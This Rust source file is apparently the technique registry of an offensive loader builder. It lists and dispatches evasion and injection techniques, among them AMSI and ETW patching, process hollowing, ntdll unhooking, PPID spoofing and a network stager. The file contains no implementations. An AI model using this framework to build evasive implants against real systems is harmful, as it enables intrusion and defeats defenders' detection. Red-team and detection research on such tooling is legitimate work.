//! Technique registry.
//!
//! Every evasion/execution technique lives in its own subdirectory (e.g.
//! [`process_hollowing`]) and is registered in [`all`]. The registry is pure
//! metadata: it feeds the `picaro techniques` CLI, the `validate` CI check
//! and the stub renderer. How to add a technique is documented in
//! `src/techniques/README.md`.

pub mod anti_debug;
pub mod bouncer;
pub mod dll_hollowing;
pub mod dotnet_hosting;
pub mod drop;
pub mod early_bird;
pub mod erase_pe_header;
pub mod execution_callbacks;
pub mod fibers;
pub mod guardrail;
pub mod hardware_breakpoints;
pub mod hide_module;
pub mod hide_thread_from_debugger;
pub mod image_path_spoofing;
pub mod import_powermodule;
pub mod living_off_the_land;
pub mod module_stomping;
pub mod network_stager;
pub mod patch_amsi;
pub mod patch_etw;
pub mod pe_injection;
pub mod powershell_hosting;
pub mod ppid_spoofing;
pub mod process_ghosting;
pub mod process_hollowing;
pub mod process_mitigations;
pub mod reflective_loading;
pub mod self_deletion;
pub mod sleep;
pub mod sleep_obfuscation;
pub mod stack_spoofing;
pub mod thread_hijacking;
pub mod timestomping;
pub mod unhook_ntdll;

use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::error::Result;
use crate::ui::{glyph, markdown, Meta, Palette, Tone};

use crate::plan::schema::{PayloadFormat, StepControl};

/// One step of the `runtime` list in the YAML plan.
///
/// A step is a technique call: the technique's `params` plus the loader's own
/// orchestration ([`StepControl`]). The two live in separate namespaces, so a
/// technique parameter can never collide with an orchestration field: the
/// technique interprets `params`, the loader reads the control fields.
///
/// ```yaml
/// runtime:
///   - technique: process_hollowing
///     params:
///       payload: implant
///       target: "C:\\Windows\\System32\\svchost.exe"
///     on_fail: continue
/// ```
///
/// `params` is optional: a technique whose parameters all have defaults (e.g.
/// `patch_amsi`) may omit it entirely.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RuntimeStep {
    /// The technique the step calls, with its `params`.
    #[serde(flatten)]
    pub technique: TechniqueKind,

    /// How the loader reacts to this step's result.
    #[serde(flatten)]
    pub control: StepControl,
}

impl RuntimeStep {
    /// Builds a step that calls `technique` with default orchestration.
    pub fn new(technique: TechniqueKind) -> Self {
        Self {
            technique,
            control: StepControl::default(),
        }
    }

    /// The technique's YAML key (used by semantic validation and the build log).
    pub fn name(&self) -> &'static str {
        self.technique.name()
    }

    /// The technique's [`Category`] (Preparation, Execution or Control).
    pub fn category(&self) -> Category {
        self.technique.category()
    }
}

/// A technique call: which technique, and the arguments it interprets.
///
/// Internally tagged enum: the step names the technique with `technique: <name>`
/// and passes its parameters under a nested `params:` mapping, so a parameter
/// can never collide with the tag.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "technique", rename_all = "snake_case")]
pub enum TechniqueKind {
    /// Detect a debugger in the current process, aborting by default
    /// (preparation).
    AntiDebug {
        /// Technique parameters (`action`).
        #[serde(default)]
        params: anti_debug::Params,
    },
    /// Hide the loader's main thread from any debugger (`ThreadHideFromDebugger`)
    /// (preparation).
    HideThreadFromDebugger {
        /// Technique parameters (none).
        #[serde(default)]
        params: hide_thread_from_debugger::Params,
    },
    /// Gate the pipeline on the host environment (preparation).
    Bouncer {
        /// Technique parameters (the declared checks).
        #[serde(default)]
        params: bouncer::Params,
    },
    /// Write an embedded `format: plain` file to a path, before the payload runs
    /// (preparation).
    Drop {
        /// Technique parameters (the destination and the asset).
        #[serde(default)]
        params: drop::Params,
    },
    /// Patch the AMSI scan exports in the current process (preparation).
    PatchAmsi {
        /// Technique parameters (the optional scan variants).
        #[serde(default)]
        params: patch_amsi::Params,
    },
    /// Patch the ETW event-writing exports in the current process
    /// (preparation).
    PatchEtw {
        /// Technique parameters (`full`, `ex`, `nt_trace`).
        #[serde(default)]
        params: patch_etw::Params,
    },
    /// Hardware-breakpoint AMSI/ETW bypass: emulate the watched exports through
    /// the CPU debug registers instead of patching them (preparation).
    HardwareBreakpoints {
        /// Technique parameters (`amsi`, `scan_string`, `open_session`, `etw`).
        #[serde(default)]
        params: hardware_breakpoints::Params,
    },
    /// Process mitigation policies: BlockDLLs, extension-point disable and an
    /// optional Win32k system-call block (preparation).
    ProcessMitigations {
        /// Technique parameters (`block_dlls`, `extension_points`,
        /// `win32k_filter`).
        #[serde(default)]
        params: process_mitigations::Params,
    },
    /// Image path spoofing: repoint the PEB's `ImagePathName` at a decoy path so
    /// the PEB readers report a legitimate image (preparation).
    ImagePathSpoofing {
        /// Technique parameters (`path`).
        #[serde(default)]
        params: image_path_spoofing::Params,
    },
    /// Erase PE header: zero the loader image's in-memory PE header so memory
    /// scanners cannot parse it (preparation).
    ErasePeHeader {
        /// Technique parameters (none).
        #[serde(default)]
        params: erase_pe_header::Params,
    },
    /// Hide module: unlink a module from the PEB's loader lists so userland PEB
    /// walkers cannot see it (preparation).
    HideModule {
        /// Technique parameters (`modules`, `hide_self`).
        #[serde(default)]
        params: hide_module::Params,
    },
    /// ntdll unhooking: restore the loaded ntdll's code section from a clean
    /// copy read from disk (preparation).
    UnhookNtdll {
        /// Technique parameters (none).
        #[serde(default)]
        params: unhook_ntdll::Params,
    },
    /// Process hollowing: run the payload inside a suspended, legitimate
    /// process instead of on disk.
    ProcessHollowing {
        /// Technique parameters (`payload`, `target`).
        #[serde(default)]
        params: process_hollowing::Params,
    },
    /// .NET hosting: start the CLR in the current process and load the managed
    /// payload as an assembly from memory.
    DotnetHosting {
        /// Technique parameters (`payload`).
        #[serde(default)]
        params: dotnet_hosting::Params,
    },
    /// PowerShell hosting: run a `.ps1` payload in-process by hosting the
    /// PowerShell engine on the CLR.
    PowershellHosting {
        /// Technique parameters (`payload`, `mode`, `command`, `command_mode`).
        #[serde(default)]
        params: powershell_hosting::Params,
    },
    /// Import a PowerShell module into the caller's session (a `kind: psmodule`
    /// build).
    ImportPowermodule {
        /// Technique parameters (`payload`).
        #[serde(default)]
        params: import_powermodule::Params,
    },
    /// Reflective loading: map the payload into the current process and run
    /// its entry point.
    ReflectiveLoading {
        /// Technique parameters (`payload`).
        #[serde(default)]
        params: reflective_loading::Params,
    },
    /// Callback execution: run the payload as the callback of a legitimate
    /// Windows enumeration API in the current process.
    ExecutionCallbacks {
        /// Technique parameters (`payload`).
        #[serde(default)]
        params: execution_callbacks::Params,
    },
    /// Fiber execution: run the payload on a fiber in the current process.
    Fibers {
        /// Technique parameters (`payload`).
        #[serde(default)]
        params: fibers::Params,
    },
    /// Module stomping: overwrite a legitimately loaded module's code with the
    /// payload and run it from there.
    ModuleStomping {
        /// Technique parameters (`payload`).
        #[serde(default)]
        params: module_stomping::Params,
    },
    /// Early Bird APC injection: spawn a suspended process, write the payload
    /// and queue an APC before the target runs.
    EarlyBird {
        /// Technique parameters (`payload`, `target`).
        #[serde(default)]
        params: early_bird::Params,
    },
    /// PE injection: map the payload image into a suspended process and start
    /// it at its entry point.
    PeInjection {
        /// Technique parameters (`payload`, `target`).
        #[serde(default)]
        params: pe_injection::Params,
    },
    /// Thread hijacking: suspend a thread that already exists in the target
    /// process, point it at the payload and resume it.
    ThreadHijacking {
        /// Technique parameters (`payload`, `target`, `pid`,
        /// `dedicated_stack`, `wait_ms`).
        #[serde(default)]
        params: thread_hijacking::Params,
    },
    /// Self-deletion: unlink the running artifact's own image (preparation).
    SelfDeletion {
        /// Technique parameters (`mode`).
        #[serde(default)]
        params: self_deletion::Params,
    },
    /// Stack spoofing: fabricate the top of the stack for every syscall
    /// (preparation).
    StackSpoofing {
        /// Technique parameters (`decoy_bytes`).
        #[serde(default)]
        params: stack_spoofing::Params,
    },
    /// Sleep obfuscation: encrypt the image region during a timer-driven
    /// sleep (preparation).
    SleepObfuscation {
        /// Technique parameters (`variant`, `sleep_ms`, `encrypt_regions`).
        #[serde(default)]
        params: sleep_obfuscation::Params,
    },
    /// Living off the land: launch a process — a signed Microsoft binary
    /// (T1218 proxy execution) or any command (control).
    LivingOffTheLand {
        /// Technique parameters (`binary`, `args`, `window`, `wait`,
        /// `timeout_s`).
        #[serde(default)]
        params: living_off_the_land::Params,
    },
    /// Wait a number of milliseconds (control).
    Sleep {
        /// Technique parameters (`ms`).
        #[serde(default)]
        params: sleep::Params,
    },
    /// Parent-process spoofing: launch a process whose recorded parent is a
    /// different, legitimate process (control).
    PpidSpoofing {
        /// Technique parameters (`binary`, `args`, `parent`, `wait`).
        #[serde(default)]
        params: ppid_spoofing::Params,
    },
    /// Network stager: fetch the payload over the network at run time (control).
    NetworkStager {
        /// Technique parameters (`payload`, `url`, `crypto`, `key`, `nonce`, ...).
        #[serde(default)]
        params: network_stager::Params,
    },
    /// Guardrail: abort the chain past a deadline or run count (preparation).
    Guardrail {
        /// Technique parameters (`expire_on`, `max_runs`, `run_key`).
        #[serde(default)]
        params: guardrail::Params,
    },
    /// Timestomping: copy a reference file's timestamps onto a target (preparation).
    Timestomping {
        /// Technique parameters (`target`, `reference`).
        #[serde(default)]
        params: timestomping::Params,
    },
    /// DLL hollowing: run the payload from a hollowed signed DLL (execution).
    DllHollowing {
        /// Technique parameters (`payload`, `module`).
        #[serde(default)]
        params: dll_hollowing::Params,
    },
    /// Process ghosting: map the payload from a delete-on-close file (execution).
    ProcessGhosting {
        /// Technique parameters (`payload`).
        #[serde(default)]
        params: process_ghosting::Params,
    },
}

impl TechniqueKind {
    /// Renders the technique's stub fragment for its parameters.
    ///
    /// `strings` is the active string-obfuscation configuration, used to
    /// obfuscate any per-build string literal (e.g. the hollowing target).
    /// `format` and `export` describe the payload the technique loads.
    pub fn render_fragment(
        &self,
        strings: &StringsConfig,
        format: PayloadFormat,
        export: Option<&str>,
    ) -> String {
        match self {
            TechniqueKind::AntiDebug { params } => params.render_fragment(strings),
            TechniqueKind::HideThreadFromDebugger { params } => params.render_fragment(strings),
            TechniqueKind::Bouncer { params } => params.render_fragment(strings),
            TechniqueKind::Drop { params } => params.render_fragment(strings),
            TechniqueKind::PatchAmsi { params } => params.render_fragment(strings),
            TechniqueKind::PatchEtw { params } => params.render_fragment(strings),
            TechniqueKind::HardwareBreakpoints { params } => params.render_fragment(strings),
            TechniqueKind::ProcessMitigations { params } => params.render_fragment(strings),
            TechniqueKind::ImagePathSpoofing { params } => params.render_fragment(strings),
            TechniqueKind::ErasePeHeader { params } => params.render_fragment(strings),
            TechniqueKind::HideModule { params } => params.render_fragment(strings),
            TechniqueKind::DotnetHosting { params } => params.render_fragment(strings),
            TechniqueKind::PowershellHosting { params } => params.render_fragment(strings),
            TechniqueKind::ImportPowermodule { params } => params.render_fragment(strings),
            TechniqueKind::ProcessHollowing { params } => {
                params.render_fragment_for(strings, format)
            }
            TechniqueKind::ReflectiveLoading { params } => {
                params.render_fragment_for(strings, format, export)
            }
            TechniqueKind::ExecutionCallbacks { params } => {
                params.render_fragment_for(strings, format, export)
            }
            TechniqueKind::Fibers { params } => params.render_fragment_for(strings, format, export),
            TechniqueKind::ModuleStomping { params } => {
                params.render_fragment_for(strings, format, export)
            }
            TechniqueKind::SleepObfuscation { params } => params.render_fragment(strings),
            TechniqueKind::UnhookNtdll { params } => params.render_fragment(strings),
            TechniqueKind::EarlyBird { params } => {
                params.render_fragment_for(strings, format, export)
            }
            TechniqueKind::PeInjection { params } => {
                params.render_fragment_for(strings, format, export)
            }
            TechniqueKind::ThreadHijacking { params } => {
                params.render_fragment_for(strings, format, export)
            }
            TechniqueKind::SelfDeletion { params } => params.render_fragment(strings),
            TechniqueKind::StackSpoofing { params } => params.render_fragment(strings),
            TechniqueKind::PpidSpoofing { params } => params.render_fragment(strings),
            TechniqueKind::LivingOffTheLand { params } => params.render_fragment(strings),
            TechniqueKind::Sleep { params } => params.render_fragment(strings),
            TechniqueKind::NetworkStager { params } => params.render_fragment(strings),
            TechniqueKind::Guardrail { params } => params.render_fragment(strings),
            TechniqueKind::Timestomping { params } => params.render_fragment(strings),
            TechniqueKind::DllHollowing { params } => {
                params.render_fragment_for(strings, format, export)
            }
            TechniqueKind::ProcessGhosting { params } => {
                params.render_fragment_for(strings, format, export)
            }
        }
    }

    /// The technique's YAML key (used by semantic validation).
    pub fn name(&self) -> &'static str {
        match self {
            TechniqueKind::AntiDebug { .. } => anti_debug::DEF.name,
            TechniqueKind::HideThreadFromDebugger { .. } => hide_thread_from_debugger::DEF.name,
            TechniqueKind::Bouncer { .. } => bouncer::DEF.name,
            TechniqueKind::Drop { .. } => drop::DEF.name,
            TechniqueKind::PatchAmsi { .. } => patch_amsi::DEF.name,
            TechniqueKind::PatchEtw { .. } => patch_etw::DEF.name,
            TechniqueKind::HardwareBreakpoints { .. } => hardware_breakpoints::DEF.name,
            TechniqueKind::ProcessMitigations { .. } => process_mitigations::DEF.name,
            TechniqueKind::ImagePathSpoofing { .. } => image_path_spoofing::DEF.name,
            TechniqueKind::ErasePeHeader { .. } => erase_pe_header::DEF.name,
            TechniqueKind::HideModule { .. } => hide_module::DEF.name,
            TechniqueKind::DotnetHosting { .. } => dotnet_hosting::DEF.name,
            TechniqueKind::PowershellHosting { .. } => powershell_hosting::DEF.name,
            TechniqueKind::ImportPowermodule { .. } => import_powermodule::DEF.name,
            TechniqueKind::ProcessHollowing { .. } => process_hollowing::DEF.name,
            TechniqueKind::ReflectiveLoading { .. } => reflective_loading::DEF.name,
            TechniqueKind::ExecutionCallbacks { .. } => execution_callbacks::DEF.name,
            TechniqueKind::Fibers { .. } => fibers::DEF.name,
            TechniqueKind::ModuleStomping { .. } => module_stomping::DEF.name,
            TechniqueKind::EarlyBird { .. } => early_bird::DEF.name,
            TechniqueKind::PeInjection { .. } => pe_injection::DEF.name,
            TechniqueKind::ThreadHijacking { .. } => thread_hijacking::DEF.name,
            TechniqueKind::SelfDeletion { .. } => self_deletion::DEF.name,
            TechniqueKind::StackSpoofing { .. } => stack_spoofing::DEF.name,
            TechniqueKind::PpidSpoofing { .. } => ppid_spoofing::DEF.name,
            TechniqueKind::UnhookNtdll { .. } => unhook_ntdll::DEF.name,
            TechniqueKind::SleepObfuscation { .. } => sleep_obfuscation::DEF.name,
            TechniqueKind::LivingOffTheLand { .. } => living_off_the_land::DEF.name,
            TechniqueKind::Sleep { .. } => sleep::DEF.name,
            TechniqueKind::NetworkStager { .. } => network_stager::DEF.name,
            TechniqueKind::Guardrail { .. } => guardrail::DEF.name,
            TechniqueKind::Timestomping { .. } => timestomping::DEF.name,
            TechniqueKind::DllHollowing { .. } => dll_hollowing::DEF.name,
            TechniqueKind::ProcessGhosting { .. } => process_ghosting::DEF.name,
        }
    }

    /// The name of the payload this technique loads, when it loads one.
    ///
    /// Only Execution techniques run a payload; a Preparation or Control step
    /// returns `None`.
    pub fn payload_name(&self) -> Option<&str> {
        match self {
            TechniqueKind::ProcessHollowing { params } => params.payload.as_deref(),
            TechniqueKind::DotnetHosting { params } => params.payload.as_deref(),
            TechniqueKind::PowershellHosting { params } => params.payload.as_deref(),
            TechniqueKind::ImportPowermodule { params } => params.payload.as_deref(),
            TechniqueKind::ReflectiveLoading { params } => params.payload.as_deref(),
            TechniqueKind::ExecutionCallbacks { params } => params.payload.as_deref(),
            TechniqueKind::Fibers { params } => params.payload.as_deref(),
            TechniqueKind::ModuleStomping { params } => params.payload.as_deref(),
            TechniqueKind::EarlyBird { params } => params.payload.as_deref(),
            TechniqueKind::PeInjection { params } => params.payload.as_deref(),
            TechniqueKind::ThreadHijacking { params } => params.payload.as_deref(),
            TechniqueKind::DllHollowing { params } => params.payload.as_deref(),
            TechniqueKind::ProcessGhosting { params } => params.payload.as_deref(),
            _ => None,
        }
    }

    /// The PowerShell-hosting parameters, when this step is one.
    ///
    /// The build reads them to compile the `.ps1` payload into a managed
    /// launcher before it is embedded.
    pub fn powershell_params(&self) -> Option<&powershell_hosting::Params> {
        match self {
            TechniqueKind::PowershellHosting { params } => Some(params),
            _ => None,
        }
    }

    /// The technique's [`Category`] (Preparation, Execution or Control).
    ///
    /// Read from the technique's [`TechniqueDef`] so the registry stays the
    /// single source of truth: a technique cannot disagree with itself.
    pub fn category(&self) -> Category {
        match self {
            TechniqueKind::AntiDebug { .. } => anti_debug::DEF.category,
            TechniqueKind::HideThreadFromDebugger { .. } => hide_thread_from_debugger::DEF.category,
            TechniqueKind::Bouncer { .. } => bouncer::DEF.category,
            TechniqueKind::Drop { .. } => drop::DEF.category,
            TechniqueKind::PatchAmsi { .. } => patch_amsi::DEF.category,
            TechniqueKind::PatchEtw { .. } => patch_etw::DEF.category,
            TechniqueKind::HardwareBreakpoints { .. } => hardware_breakpoints::DEF.category,
            TechniqueKind::ProcessMitigations { .. } => process_mitigations::DEF.category,
            TechniqueKind::ImagePathSpoofing { .. } => image_path_spoofing::DEF.category,
            TechniqueKind::ErasePeHeader { .. } => erase_pe_header::DEF.category,
            TechniqueKind::HideModule { .. } => hide_module::DEF.category,
            TechniqueKind::DotnetHosting { .. } => dotnet_hosting::DEF.category,
            TechniqueKind::PowershellHosting { .. } => powershell_hosting::DEF.category,
            TechniqueKind::ImportPowermodule { .. } => import_powermodule::DEF.category,
            TechniqueKind::ProcessHollowing { .. } => process_hollowing::DEF.category,
            TechniqueKind::ReflectiveLoading { .. } => reflective_loading::DEF.category,
            TechniqueKind::ExecutionCallbacks { .. } => execution_callbacks::DEF.category,
            TechniqueKind::Fibers { .. } => fibers::DEF.category,
            TechniqueKind::ModuleStomping { .. } => module_stomping::DEF.category,
            TechniqueKind::EarlyBird { .. } => early_bird::DEF.category,
            TechniqueKind::PeInjection { .. } => pe_injection::DEF.category,
            TechniqueKind::ThreadHijacking { .. } => thread_hijacking::DEF.category,
            TechniqueKind::SelfDeletion { .. } => self_deletion::DEF.category,
            TechniqueKind::StackSpoofing { .. } => stack_spoofing::DEF.category,
            TechniqueKind::PpidSpoofing { .. } => ppid_spoofing::DEF.category,
            TechniqueKind::UnhookNtdll { .. } => unhook_ntdll::DEF.category,
            TechniqueKind::SleepObfuscation { .. } => sleep_obfuscation::DEF.category,
            TechniqueKind::LivingOffTheLand { .. } => living_off_the_land::DEF.category,
            TechniqueKind::Sleep { .. } => sleep::DEF.category,
            TechniqueKind::NetworkStager { .. } => network_stager::DEF.category,
            TechniqueKind::Guardrail { .. } => guardrail::DEF.category,
            TechniqueKind::Timestomping { .. } => timestomping::DEF.category,
            TechniqueKind::DllHollowing { .. } => dll_hollowing::DEF.category,
            TechniqueKind::ProcessGhosting { .. } => process_ghosting::DEF.category,
        }
    }
}

/// Which role a technique plays in the pipeline.
///
/// Variant order is meaningful: it defines the sort key used by
/// [`list`] (Preparation before Execution).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Category {
    /// Modifies the current process state (e.g. patches AMSI) but never runs
    /// the payload.
    Preparation,
    /// Executes the decrypted payload.
    Execution,
    /// Neither prepares state nor runs the payload: it orchestrates the chain
    /// (launch a process, wait). `living_off_the_land` and `sleep`.
    Control,
}

impl Category {
    /// Lowercase label used by `picaro techniques list`.
    pub fn label(self) -> &'static str {
        match self {
            Category::Preparation => "preparation",
            Category::Execution => "execution",
            Category::Control => "control",
        }
    }
}

/// Maturity of a technique.
///
/// Variants are part of the metadata vocabulary; only the ones used by the
/// currently-registered techniques are constructed.
///
/// Variant order is meaningful: it defines the sort key used by [`list`]
/// (Stable before Experimental before Unimplemented before Deprecated).
#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Stability {
    /// Complete and verified: a measurement baseline or passing runtime checks.
    Stable,
    /// Works, but a gap or a caveat remains (see the technique's README).
    Experimental,
    /// Registered and wired (registry arm, metadata, docs, tests) but **not
    /// finished**: either the stub fragment is a placeholder or a required part
    /// of the loader contract is missing, so it must not be shipped as-is.
    /// `plan::validate::advisories` warns when a runtime selects one.
    Unimplemented,
    /// Superseded by a better technique; kept for old plans.
    Deprecated,
}

impl Stability {
    /// Lowercase label used by `picaro techniques list`.
    pub fn label(self) -> &'static str {
        match self {
            Stability::Stable => "stable",
            Stability::Experimental => "experimental",
            Stability::Unimplemented => "unimplemented",
            Stability::Deprecated => "deprecated",
        }
    }
}

/// A capability the build host must provide for a technique.
///
/// The architecture variants (`WindowsX64` / `WindowsX86`) gate which
/// `build.output.arch` a technique can run under; `plan::validate` checks them
/// against the plan. Variants are part of the metadata vocabulary; only the ones
/// used by the currently-registered techniques are constructed.
#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Capability {
    WindowsX64,
    WindowsX86,
    KernelAccess,
    AdminRequired,
}

impl Capability {
    /// Lowercase label used by `picaro techniques show`.
    pub fn label(self) -> &'static str {
        match self {
            Capability::WindowsX64 => "windows-x64",
            Capability::WindowsX86 => "windows-x86",
            Capability::KernelAccess => "kernel-access",
            Capability::AdminRequired => "admin-required",
        }
    }
}

/// One YAML parameter of a registry item.
///
/// The shared vocabulary for the catalog: a technique derives its parameters
/// from its `Params` struct at docs-build time, while a loader feature declares
/// them here directly (it has no `Params` struct). Both render as the same
/// `Parameter | Type | Required | Default | Description` table.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ParamDef {
    /// Key as it appears under `params:` (or in the feature's YAML block).
    pub key: &'static str,
    /// One sentence shown to the reader.
    pub description: &'static str,
    /// Whether omitting it is an error (as opposed to falling back to `default`).
    pub required: bool,
    /// Default value as written in YAML (e.g. `0x1000`, `wininet.dll`).
    pub default: Option<&'static str>,
    /// The value's shape.
    pub kind: ParamKind,
}

/// The shape of a [`ParamDef`] value.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ParamKind {
    /// A string.
    Str,
    /// A YAML sequence.
    List,
    /// One of a fixed set of strings.
    Enum(&'static [&'static str]),
}

impl ParamKind {
    /// The YAML type label shown in `techniques show` and the docs table.
    pub fn label(self) -> &'static str {
        match self {
            ParamKind::Str | ParamKind::Enum(_) => "string",
            ParamKind::List => "list",
        }
    }
}

/// Static metadata describing one technique.
///
/// No logic here — only data consumed by the `techniques` CLI, the `validate`
/// check and the stub renderer.
pub struct TechniqueDef {
    /// YAML key (`technique: <name>`).
    pub name: &'static str,
    /// MITRE ATT&CK technique IDs.
    pub attck: &'static [&'static str],
    /// Maturity.
    pub stability: Stability,
    /// Capabilities the build host must provide.
    pub requires: &'static [Capability],
    /// Names of techniques this one conflicts with.
    pub conflicts: &'static [&'static str],
    /// Pipeline role: Preparation (modifies state) or Execution (runs payload).
    pub category: Category,
    /// Payload formats this Execution technique accepts (`&[]` for a
    /// Preparation/Control step, which runs no payload). `plan::validate` reads
    /// it, and the docs derive the plan builder's accepted formats from it — so
    /// the accepted formats live here, once.
    pub formats: &'static [PayloadFormat],
    /// Whether the technique only works with `build.stub.syscalls.mode: indirect`
    /// (the renderer skips its step; `advisories` warns otherwise).
    pub requires_indirect_syscalls: bool,
    /// Path to the human-readable README (relative to the repo root).
    pub doc_path: &'static str,
    /// The technique's stub fragment source (embedded via `include_str!`).
    pub stub_fragment: &'static str,
    /// A YAML snippet (parseable as a [`RuntimeStep`]) documenting the params.
    pub params_example: &'static str,
    /// The technique's README, embedded via `include_str!` for `techniques show`.
    pub readme: &'static str,
    /// Nt* functions this technique invokes through the syscall layer when
    /// `build.stub.syscalls.mode: indirect` is active. The packer resolves only
    /// the union of the active techniques' requirements (see
    /// `engine::syscalls::required`).
    pub syscalls: &'static [&'static str],
    /// Whether the technique needs the shared payload import resolver
    /// (`engine::imports`) rendered into the stub. The resolver is emitted only
    /// when an active technique declares it, so no unused code is injected.
    pub resolves_imports: bool,
}

/// All registered techniques.
pub fn all() -> &'static [TechniqueDef] {
    &[
        dotnet_hosting::DEF,
        powershell_hosting::DEF,
        import_powermodule::DEF,
        process_hollowing::DEF,
        reflective_loading::DEF,
        execution_callbacks::DEF,
        fibers::DEF,
        module_stomping::DEF,
        early_bird::DEF,
        pe_injection::DEF,
        thread_hijacking::DEF,
        ppid_spoofing::DEF,
        self_deletion::DEF,
        stack_spoofing::DEF,
        unhook_ntdll::DEF,
        patch_amsi::DEF,
        anti_debug::DEF,
        hide_thread_from_debugger::DEF,
        patch_etw::DEF,
        hardware_breakpoints::DEF,
        process_mitigations::DEF,
        sleep_obfuscation::DEF,
        bouncer::DEF,
        drop::DEF,
        living_off_the_land::DEF,
        sleep::DEF,
        network_stager::DEF,
        guardrail::DEF,
        timestomping::DEF,
        image_path_spoofing::DEF,
        erase_pe_header::DEF,
        hide_module::DEF,
        dll_hollowing::DEF,
        process_ghosting::DEF,
    ]
}

/// Looks up a technique by its YAML key.
pub fn find(name: &str) -> Option<&'static TechniqueDef> {
    all().iter().find(|def| def.name == name)
}

/// Section headings every technique README must contain (see
/// `_template/README.md`).
///
/// The README is the prose explanation only: the technique's metadata
/// (category, stability, ATT&CK, platforms, syscalls, params, example) lives in
/// its `TechniqueDef` and is rendered from the registry by `picaro techniques
/// show` and the docs site, so a README never repeats it.
const REQUIRED_SECTIONS: &[&str] = &[
    "## What it does",
    "## How it works",
    "## Integration",
    "## What it evades",
    "## What detects it",
    "## Measurements",
    "## Implementation notes",
    "## References",
];

/// Headings that must NOT appear in a README: the same data lives in
/// [`TechniqueDef`] and is rendered from it (the docs page and `techniques
/// show`), so duplicating it in the README is the drift this split avoids.
const FORBIDDEN_SECTIONS: &[&str] = &["## Metadata", "## YAML parameters", "## YAML example"];

/// The widest cell of a listing column, header included.
///
/// The table is measured instead of fixed: a technique name or an ATT&CK list
/// longer than the rest must not push the remaining columns of its own row out
/// of line.
pub(crate) fn column_width(header: &str, values: impl Iterator<Item = String>) -> usize {
    values
        .map(|value| value.chars().count())
        .chain(std::iter::once(header.chars().count()))
        .max()
        .unwrap_or(0)
}

/// Pads a cell to `width`.
///
/// The padding happens before the cell is styled: padding an already-colored
/// string would count the escape codes and misalign the row (see
/// [`stability_label`], which pads for the same reason).
pub(crate) fn pad(text: &str, width: usize) -> String {
    format!("{text:<width$}")
}

/// Renders the `picaro techniques list` output.
pub fn list(ui: &Palette) -> String {
    let mut out = String::new();

    // Grouped by category, then maturity, then name: the listing reads as a
    // pipeline (Preparation before Execution) with the most reliable entries
    // first inside each group.
    let mut defs: Vec<&TechniqueDef> = all().iter().collect();
    defs.sort_by_key(|def| (def.category, def.stability, def.name));

    let name_w = column_width("TECHNIQUE", defs.iter().map(|def| def.name.to_string()));
    let category_w = column_width(
        "CATEGORY",
        defs.iter().map(|def| def.category.label().to_string()),
    );
    let stability_w = column_width(
        "STABILITY",
        defs.iter().map(|def| def.stability.label().to_string()),
    );
    let attck_w = column_width("ATT&CK", defs.iter().map(|def| def.attck.join(", ")));

    out.push_str(&format!(
        "{} {} {} {} {}\n",
        ui.dim(pad("TECHNIQUE", name_w)),
        ui.dim(pad("CATEGORY", category_w)),
        ui.dim(pad("STABILITY", stability_w)),
        ui.dim(pad("ATT&CK", attck_w)),
        ui.dim("SUMMARY"),
    ));
    for def in defs {
        let name = ui.bold(pad(def.name, name_w));
        let category = pad(def.category.label(), category_w);
        let stability = stability_label(def.stability, ui, stability_w);
        let attck = pad(&def.attck.join(", "), attck_w);
        out.push_str(&format!(
            "{name} {category} {stability} {attck} {}\n",
            truncate(summary(def), 70)
        ));
    }

    let count = |category: Category| all().iter().filter(|d| d.category == category).count();
    out.push_str(&format!(
        "\n{} {}\n",
        glyph::DOT,
        ui.dim(format!(
            "{} techniques ({} preparation, {} execution, {} control)",
            all().len(),
            count(Category::Preparation),
            count(Category::Execution),
            count(Category::Control),
        ))
    ));

    // Legend: two dim lines. Their first token is never a technique name, so
    // the table-shape tests keep matching only real rows.
    out.push_str(&format!(
        "  {} {}  {}  {}  {}\n",
        ui.dim("stability:"),
        ui.ok(Stability::Stable.label()),
        ui.warn(Stability::Experimental.label()),
        ui.error(Stability::Unimplemented.label()),
        ui.error(Stability::Deprecated.label()),
    ));
    out.push_str(&format!(
        "  {} {}\n",
        ui.dim("show:"),
        ui.dim("picaro techniques show <name> for the full README"),
    ));

    // Loader features (`syscalls`, `api_resolution`, `strings`, `args`) are not
    // runtime steps; they are listed in their own table so the registry view is
    // complete.
    out.push('\n');
    out.push_str(&crate::features::list(ui));
    out.push('\n');
    out.push_str(&crate::engine::syscalls::resolvers::list(ui));
    out
}

/// A stability label padded to `width` and colored by maturity.
///
/// Shared by the technique and loader-feature listings.
pub(crate) fn stability_label(stability: Stability, ui: &Palette, width: usize) -> String {
    let label = format!("{name:<width$}", name = stability.label(), width = width);
    match stability {
        Stability::Stable => ui.ok(label),
        Stability::Experimental => ui.warn(label),
        Stability::Unimplemented => ui.error(label),
        Stability::Deprecated => ui.error(label),
    }
}

/// The technique's README as embedded Markdown, verbatim.
pub fn readme(name: &str) -> Result<&'static str> {
    if let Some(def) = find(name) {
        return Ok(def.readme);
    }
    // Not a technique: it may be a loader feature or an SSN resolver.
    crate::features::readme(name).or_else(|_| crate::engine::syscalls::resolvers::readme(name))
}

/// Renders `picaro techniques show <name>`: a styled header built from the
/// technique's metadata, followed by its README rendered as Markdown.
pub fn show(name: &str, ui: &Palette) -> Result<String> {
    let Some(def) = find(name) else {
        // Not a technique: it may be a loader feature (`syscalls`, `strings`, …)
        // or an SSN resolver (`hells_gate`, …).
        return crate::features::show(name, ui)
            .or_else(|_| crate::engine::syscalls::resolvers::show(name, ui));
    };
    let width = crate::ui::term_width();

    let mut out = String::new();
    out.push_str(&ui.heading(readme_title(def.readme).unwrap_or(def.name)));
    out.push_str("\n\n");

    out.push_str(&ui.meta_bar(&[
        Meta {
            key: "CATEGORY",
            value: def.category.label().to_string(),
            tone: Tone::Value,
        },
        Meta {
            key: "STABILITY",
            value: def.stability.label().to_string(),
            tone: stability_tone(def.stability),
        },
        Meta {
            key: "ATT&CK",
            value: def.attck.join(", "),
            tone: Tone::Value,
        },
    ]));
    out.push('\n');

